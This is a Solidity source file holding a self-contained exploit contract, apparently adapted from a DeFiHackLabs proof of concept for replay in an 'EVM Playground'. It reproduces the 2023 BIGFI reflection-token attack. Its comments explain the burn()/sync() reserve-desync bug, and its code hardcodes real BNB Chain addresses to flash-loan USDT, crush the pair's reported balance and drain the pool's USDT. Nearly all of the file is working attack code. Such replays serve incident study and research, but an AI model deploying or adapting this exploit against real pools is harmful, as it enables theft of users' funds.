// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-BIGFI).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is Test; testExploit() calls swapFlashLoan.flashLoan(address(this), ...)
// and the Aave-style flash-loan callback `executeOperation` lives on the test itself),
// so there is no standalone contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, executeOperation,
// USDTToBIGFI, BIGFIToUSDT) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/BIGFI_exp.sol.
//
// Root cause: BIGFI is a reflection token (same family as BEVO/TINU/FDP/Sheep/
// Starlink) whose balanceOf() is derived from a global reflection ratio
// (_rOwned(holder) * tTotal / rTotal). burn() reduces tTotal (and the caller's
// _rOwned) without adjusting the LP pair's own _rOwned proportionally, so calling
// burn() with a carefully computed amount can crush the pair's reported BIGFI
// balanceOf() down to a dust value (here: 1) while the pair's real underlying
// reserves are untouched. Pair.sync() then reads that crushed balanceOf() and
// commits it as the new reserve1, desyncing the AMM price from the pool's real
// holdings. The attacker immediately sells a trivial amount of BIGFI back into
// the pool at this manipulated (near-infinite BIGFI-per-USDT) price and drains
// almost the entire USDT reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface RDeflationERC20 is IERC20 {
    function burn(uint256 amount) external;
}

interface ISwapFlashLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface Uni_Pair_V2 {
    function sync() external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BIGFIExploit {
    RDeflationERC20 constant BIGFI = RDeflationERC20(0xd3d4B46Db01C006Fb165879f343fc13174a1cEeB);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISwapFlashLoan constant swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);
    Uni_Router_V2 constant ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant PAIR = Uni_Pair_V2(0xA269556EdC45581F355742e46D2d722c5F3f551a);

    // step 0: flash-loan 200,000 USDT from the Aave-style pool (delegatecall proxy).
    function run() external {
        swapFlashLoan.flashLoan(address(this), address(USDT), 200_000 * 1e18, new bytes(1));
    }

    // Aave-style flash-loan callback.
    function executeOperation(
        address, /* pool */
        address, /* token */
        uint256 amount,
        uint256 fee,
        bytes calldata /* params */
    ) external payable {
        // step 1: dump the whole flash-loaned USDT into the pool for BIGFI.
        USDTToBIGFI();

        // step 2: the bug — burn() enough BIGFI supply to crush the pair's own
        // reflected balanceOf() down to 1, without touching the pair's real reserves.
        // beforebalanceOf(Pair) == (_rOwned(Pair) * before_tTotal / _rTotal)
        // to reduce the balanceOf(Pair) to 1, the amount of _tTotal to burn =
        // _tTotal - (_rTotal / _rOwned(Pair)) = _tTotal - (before_tTotal / beforebalanceOf(Pair))
        uint256 burnAmount = BIGFI.totalSupply() - 2 * (BIGFI.totalSupply() / BIGFI.balanceOf(address(PAIR)));
        BIGFI.burn(burnAmount);

        // step 3: sync() commits the crushed balanceOf(Pair) as the new reserve, desyncing price.
        PAIR.sync();

        // step 4: sell a trivial amount of BIGFI back at the now-manipulated price, draining USDT.
        BIGFIToUSDT();

        // step 5: repay the flash loan (amount + fee) from the drained USDT.
        USDT.transfer(address(swapFlashLoan), amount + fee);
    }

    function USDTToBIGFI() internal {
        USDT.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(BIGFI);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function BIGFIToUSDT() internal {
        BIGFI.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BIGFI);
        path[1] = address(USDT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BIGFI.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
